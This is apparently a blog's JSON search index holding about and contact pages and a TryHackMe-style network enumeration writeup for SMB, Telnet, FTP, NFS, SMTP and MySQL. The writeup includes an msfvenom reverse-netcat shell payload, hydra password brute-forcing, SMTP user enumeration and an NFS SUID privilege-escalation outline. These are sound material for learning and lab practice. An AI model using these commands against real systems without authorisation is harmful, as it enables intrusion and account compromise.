[{"content":"This section would be updated with lots of questions and answers which will help you to ACE CEH ANSI exam.\nThis is prepared by Jayavamsi Villuri aka velofjay\n","permalink":"http://localhost:1313/blog/slug/","summary":"This blog helps you to ACE the CEH ANSI","title":"CEH V12 Prep Guide by VelOfJay - The Only Guide You Need"},{"content":" Hello fr13nd, this is Jayavamsi Villuri (JV) aka VELOFJAY\nTwitter/X LinkedIn GitHub Email ","permalink":"http://localhost:1313/contact/","summary":"\u003cblockquote\u003e\n\u003cp\u003eHello fr13nd, this is \u003cstrong\u003eJayavamsi Villuri (JV)\u003c/strong\u003e aka \u003cstrong\u003eVELOFJAY\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://x.com/velofjay\"\u003eTwitter/X\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://linkedin.com/in/jayavamsi9\"\u003eLinkedIn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/velofjay\"\u003eGitHub\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"mailto:jayavamsi.v@gmail.com\"\u003eEmail\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Contact Me"},{"content":" Jayavamsi Villuri CEH Master | Software, Security \u0026amp; Blockchain Engineer\nHi, I\u0026rsquo;m Jayavamsi Villuri, a passionate engineer with a strong focus on cybersecurity, data engineering, and blockchain development. I love building things for the web, securing them, and breaking them to make them stronger.\nOver the past few years, I have been exploring the intersections of technology and security, and my mission is to contribute to a safer, decentralized, and data-driven world.\nProfessional Journey üöÄ Cybersecurity Expertise: As a CEH Master, I specialize in ethical hacking, penetration testing, and securing web applications. I thrive on solving Capture The Flag (CTF) challenges and have developed a knack for identifying vulnerabilities in real-world systems. Data Engineering: With proficiency in AWS, BigQuery, and Python, I build scalable data pipelines and design efficient workflows for handling big data. Blockchain Development: I\u0026rsquo;m diving into the exciting world of Solidity and smart contract development, creating secure and decentralized solutions to modern problems. Core Skills üõ† Cybersecurity Tools: Metasploit, Burp Suite, Wireshark, Nmap. Programming Languages: Python, GoLang, Solidity, SQL. Data Engineering: AWS Data Pipelines, BigQuery, ETL Workflows. Blockchain: Ethereum, Smart Contracts, DApps. DevOps: Docker, GCP, Cloud Functions. Certifications üèÖ Certified Ethical Hacker (CEH) Master Google Associate Cloud Engineer Interests üí° I enjoy working on projects that merge security, data, and blockchain technology. Some of my current goals include:\nüõ†Ô∏è Building decentralized applications (DApps). ‚úçÔ∏è Publishing writeups and walkthroughs on CTF challenges and blockchain security. üîé Exploring innovations in cybersecurity and Web3. When I‚Äôm not coding üíª, you‚Äôll find me strategizing my next big move ü§î, playing CTF challenges üè¥‚Äç‚ò†Ô∏è, or planning how to scale my skills üìà and contribute to the tech community üåü.\nLet‚Äôs Connect üåê I‚Äôm always open to collaborations, mentorship, or simply sharing ideas. Feel free to explore my writeups and projects, or reach out to me directly on LinkedIn.\n","permalink":"http://localhost:1313/about/","summary":"\u003cblockquote\u003e\n\u003ch3 id=\"jayavamsi-villuri\"\u003e\u003cstrong\u003eJayavamsi Villuri\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e\u003cem\u003eCEH Master | Software, Security \u0026amp; Blockchain Engineer\u003c/em\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eHi, I\u0026rsquo;m \u003cstrong\u003eJayavamsi Villuri\u003c/strong\u003e, a passionate engineer with a strong focus on \u003cstrong\u003ecybersecurity\u003c/strong\u003e, \u003cstrong\u003edata engineering\u003c/strong\u003e, and \u003cstrong\u003eblockchain development\u003c/strong\u003e. I love building things for the web, securing them, and breaking them to make them stronger.\u003c/p\u003e\n\u003cp\u003eOver the past few years, I have been exploring the intersections of \u003cstrong\u003etechnology and security\u003c/strong\u003e, and my mission is to contribute to a safer, decentralized, and data-driven world.\u003c/p\u003e","title":"About Me"},{"content":"heading one two three heading 2 heading 3 1 bash hi.sh 1 2 x = 69 print(\u0026#39;hi\u0026#39;) ","permalink":"http://localhost:1313/writeups/thm/","summary":"this is summary","title":"Try Hack Me"},{"content":"SMB - Server Message Block Understanding SMB stands for server message block. It is a client-server communication protocol user for sharing access to files, printers, ports and other resources of the network. It is a request-response protocol Samba is an open-source server. Clients connect to the SMB server using TCP/IP protocol. SMB runs on port 139/445 Enumerating Port Scanning First thing to do in enumeration is port scanning. Scan ports using nmap tool Enum4Linux It is used for enumerating SMB shares. Cross-compatibility It comes default in parrot and Kali and can also be cloned from github Coming to syntax : enum4linux [options] ip Flags and functions are as follows: -U ‚Äî\u0026gt; get user list -G ‚Äî\u0026gt; get group and member list -P ‚Äî\u0026gt; get password policy information -M ‚Äî\u0026gt; get machine list -S ‚Äî\u0026gt; get share list -N ‚Äî\u0026gt; get namelist dump -A ‚Äî\u0026gt; all of the above information Exploiting SMBClient In order to access smb shares we need one client called smbclient\nAccess shares : smbclient //ip/share-name\nsmbclient //IP//share-name\n-U ‚Äî\u0026gt; to specify user -p ‚Äî\u0026gt; to specify port We can download entire smb share using smbget\nsmbget -R smb://ip/anonymous\nTo connect to a share : smbclient \\\\ip\\share-name\nTelnet Understanding It is an application protocol it serves on port 23 It uses clear text for communication telnet is the client and the syntax is : telnet ip port Enumerating Port Scanning\nFind for open ports using nmap\nExploiting Connecting to telnet\ntelnet ip port\nPayload\nIf telnet server accepts commands then generate a payload with msfvenom and get the reverse shell.\nmsfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R ( This gives raw payload output )\ntcpdump\nIf necessary start tcpdump to monitor packets and syntax is sudo tcpdump proto \\ -i Ex, sudo tcpdump ip proto \\icmp -i eth0\nFTP - File Transfer Protocol Understanding FTP is a protocol used for sharing files over a network It is a client-server model It runs default on port 21 There are 2 modes of FTP connections Active ‚Äî\u0026gt; We(client) listens on a port and server connects to our listening port. Passive ‚Äî\u0026gt; Server listens on a port we(client) connect to that listening port. FTP communication is not encrypted. Enumerating Connect\nftp ip\nCheck for anonymous login and connect accordingly. Finally, enumerate the listable files.\nExploiting Check for the files and get them.\nIf needed crack passwords using hydra\nhydra -t 4 -l -P /path/of/wordlist ip -vV\n-t 4 specifies parallel connections for bruteforcing\nNFS - Network File system Understanding It allows to share directories and files over a network. File sharing is done through mounting. This mounting uses RPC daemon for file transfer. It checks for required user permissions for mounting. It takes 3 parameters : file handle name of the file to be accessed user ID, group ID Enumerating nfs-common\nnfs-common share needs to be installed for further enumeration because it consists of various programs such as lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs It can be installed if it is not using the command sudo apt install nfs-common Port Scanning\nScan the machine for open ports, services using nmap\nMounting NFS shares\ncreate one directory to mount ( remote files / directories of the share will be shown in this created directory )\nsudo mount -t nfs :share /tmp/mount/ -nolock\n-t nfs ‚Äî\u0026gt; type of device to mount\n-nolock ‚Äî\u0026gt; Specifies not to use NLM locking\n/usr/sbin/showmount -e ‚Äî\u0026gt; to list the NFS shares\nExploiting root_squash\nBy default, root squashing is enabled and it prevents anyone connecting to the NFS share from having root access to the NFS volume. It has a user called \u0026ldquo;nfsnobody\u0026rdquo; which has low privileges. If root_squash is disabled then we can create SUID bit files and escalate privileges as root user. SUID\nThe file(s) which can run with the permission of file owner/group that means as super-user are called as SUID files. It will be helpful for escalating privileges.\nHow to exploit\nUpload file to the NFS share by controlling the permissions of files\nChange the created group to user : sudo chown root Add SUID permission and make it executable ny adding +x : sudo chmod +S SMTP - Simple Mail Transfer Protocol Understanding It stands for simple Mail Transfer Protocol and runs on port 25 SMTP server functions are : It verifies who is sending mails through SMTP server It sends outgoing mails If outgoing mail is not delivered then it sends message back to the sender POP and IMAP POP stands for Post Office Protocol IMAP stands for Internet Message Access Protocol These both are responsible for transfer of emails between client and server First, sender sends mail through SMTP server Then, SMTP server performs SMTP handshake If the mail is deliverable then it sends to receiver\u0026rsquo;s POP/IMAP server. Else, to the SMTP queue. Enumerating Server Details smtp_version : metasploit module used for enumerating version Find smtp version either through metasploit or kali\u0026rsquo;ssmtp-user-enum script or using hydra Users smtp_enum : metasploit module used for enumerating users It has two commands for enumerating users : VRFY ‚Äî\u0026gt; Confirming name of valid users EXPN ‚Äî\u0026gt; It reveals user\u0026rsquo;s aliases and mailing lists Syntax smtp-user-enum\n$ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip\nsmtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.110.155 -w 60\nhydra\nhydra smtp-enum://ip/vrfy -L /usr/share/seclists/Usernames/Names/malenames-usa-top1000-lower.txt\nExploiting Hydra If ssh is open then bruteforce the password using hydra because we have username from enumerating section. Syntax,hydra -t 16 -l -P /path/to/wordlist ssh -vV -t 16 ‚Äî\u0026gt; number of parallel connections for bruteforcing MySQL Understanding MySQL is a relational database management system ( RDBMS ) based on Structured Query Language ( SQL ) it runs on port 3306 RDBMS is a software / service used for creating and manipulatng relational ( tables ) model Client-server communication protocol Enumerating Basic information\nIt will come handy if we have basic information like usernames and all so that we could bruteforce to find the credentials.\nCredentials\nLet\u0026rsquo;s say we have credentials \u0026ldquo;root:password\u0026rdquo;\nMySQL client\nMake sure you have MySQL client installed\nsudo apt install default-mysql-client\nMetasploit and Manual\nFor manual enumeration :\nnmap\u0026rsquo;s mysql-enum script https://www.exploit-db.com/exploits/23081 Login\nmysql -h -u -p\nExecute queries\nExecute SQL queries for databases, version information\nExploiting mysql_schemadump\nMetasploit module for dumping schemas\n","permalink":"http://localhost:1313/writeups/network-enumeration.thm/","summary":"This is all about various network services, their enumeration and their exploitation.","title":"Network Enumeration"}]